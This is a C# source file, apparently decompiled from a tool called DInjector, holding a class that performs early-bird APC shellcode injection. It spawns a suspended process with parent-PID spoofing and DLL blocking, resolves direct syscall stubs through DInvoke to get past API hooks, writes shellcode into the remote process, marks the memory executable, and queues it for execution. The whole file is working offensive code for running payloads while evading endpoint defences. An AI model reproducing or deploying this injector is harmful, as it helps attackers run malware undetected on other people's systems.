using System;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000012 RID: 18
	internal class RemoteThreadAPC
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00004768 File Offset: 0x00002968
		public static void Execute(byte[] shellcodeBytes, string processImage, int ppid = 0, bool blockDlls = false)
		{
			Win32.ProcessThreadsAPI._PROCESS_INFORMATION process_INFORMATION = SpawnProcess.Execute(processImage, "C:\\Windows\\System32", true, ppid, blockDlls);
			RemoteThreadAPC.NtAllocateVirtualMemory ntAllocateVirtualMemory = (RemoteThreadAPC.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(RemoteThreadAPC.NtAllocateVirtualMemory));
			IntPtr hProcess = process_INFORMATION.hProcess;
			IntPtr zero = IntPtr.Zero;
			IntPtr intPtr = (IntPtr)shellcodeBytes.Length;
			DInvoke.Data.Native.NTSTATUS ntstatus = ntAllocateVirtualMemory(hProcess, ref zero, IntPtr.Zero, ref intPtr, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadAPC) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
			}
			RemoteThreadAPC.NtWriteVirtualMemory ntWriteVirtualMemory = (RemoteThreadAPC.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWriteVirtualMemory"), typeof(RemoteThreadAPC.NtWriteVirtualMemory));
			IntPtr intPtr2 = Marshal.AllocHGlobal(shellcodeBytes.Length);
			Marshal.Copy(shellcodeBytes, 0, intPtr2, shellcodeBytes.Length);
			uint num = 0U;
			ntstatus = ntWriteVirtualMemory(hProcess, zero, intPtr2, (uint)shellcodeBytes.Length, ref num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadAPC) [-] NtWriteVirtualMemory: {0}", ntstatus));
			}
			Marshal.FreeHGlobal(intPtr2);
			uint num2;
			ntstatus = ((RemoteThreadAPC.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(RemoteThreadAPC.NtProtectVirtualMemory)))(hProcess, ref zero, ref intPtr, 32U, out num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadAPC) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			RemoteThreadAPC.NtOpenThread ntOpenThread = (RemoteThreadAPC.NtOpenThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtOpenThread"), typeof(RemoteThreadAPC.NtOpenThread));
			IntPtr zero2 = IntPtr.Zero;
			RemoteThreadAPC.OBJECT_ATTRIBUTES object_ATTRIBUTES = default(RemoteThreadAPC.OBJECT_ATTRIBUTES);
			RemoteThreadAPC.CLIENT_ID client_ID = new RemoteThreadAPC.CLIENT_ID
			{
				UniqueThread = (IntPtr)((long)((ulong)process_INFORMATION.dwThreadId))
			};
			ntstatus = ntOpenThread(ref zero2, Win32.Kernel32.ThreadAccess.SetContext, ref object_ATTRIBUTES, ref client_ID);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadAPC) [+] NtOpenThread");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadAPC) [-] NtOpenThread: {0}", ntstatus));
			}
			ntstatus = ((RemoteThreadAPC.NtQueueApcThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtQueueApcThread"), typeof(RemoteThreadAPC.NtQueueApcThread)))(zero2, zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadAPC) [+] NtQueueApcThread");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadAPC) [-] NtQueueApcThread: {0}", ntstatus));
			}
			RemoteThreadAPC.NtAlertResumeThread ntAlertResumeThread = (RemoteThreadAPC.NtAlertResumeThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAlertResumeThread"), typeof(RemoteThreadAPC.NtAlertResumeThread));
			uint num3 = 0U;
			ntstatus = ntAlertResumeThread(process_INFORMATION.hThread, ref num3);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
				return;
			}
			Console.WriteLine(string.Format("(RemoteThreadAPC) [-] NtAlertResumeThread: {0}", ntstatus));
		}

		// Token: 0x0200005D RID: 93
		// (Invoke) Token: 0x060000EE RID: 238
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, Win32.Advapi32.CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

		// Token: 0x0200005E RID: 94
		// (Invoke) Token: 0x060000F2 RID: 242
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

		// Token: 0x0200005F RID: 95
		// (Invoke) Token: 0x060000F6 RID: 246
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);

		// Token: 0x02000060 RID: 96
		// (Invoke) Token: 0x060000FA RID: 250
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x02000061 RID: 97
		// (Invoke) Token: 0x060000FE RID: 254
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtOpenThread(ref IntPtr ThreadHandle, Win32.Kernel32.ThreadAccess dwDesiredAccess, ref RemoteThreadAPC.OBJECT_ATTRIBUTES ObjectAttributes, ref RemoteThreadAPC.CLIENT_ID ClientId);

		// Token: 0x02000062 RID: 98
		// (Invoke) Token: 0x06000102 RID: 258
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

		// Token: 0x02000063 RID: 99
		// (Invoke) Token: 0x06000106 RID: 262
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAlertResumeThread(IntPtr ThreadHandle, ref uint SuspendCount);

		// Token: 0x02000064 RID: 100
		private struct OBJECT_ATTRIBUTES
		{
			// Token: 0x0400028D RID: 653
			public int Length;

			// Token: 0x0400028E RID: 654
			public IntPtr RootDirectory;

			// Token: 0x0400028F RID: 655
			public IntPtr ObjectName;

			// Token: 0x04000290 RID: 656
			public uint Attributes;

			// Token: 0x04000291 RID: 657
			public IntPtr SecurityDescriptor;

			// Token: 0x04000292 RID: 658
			public IntPtr SecurityQualityOfService;
		}

		// Token: 0x02000065 RID: 101
		private struct CLIENT_ID
		{
			// Token: 0x04000293 RID: 659
			public IntPtr UniqueProcess;

			// Token: 0x04000294 RID: 660
			public IntPtr UniqueThread;
		}
	}
}
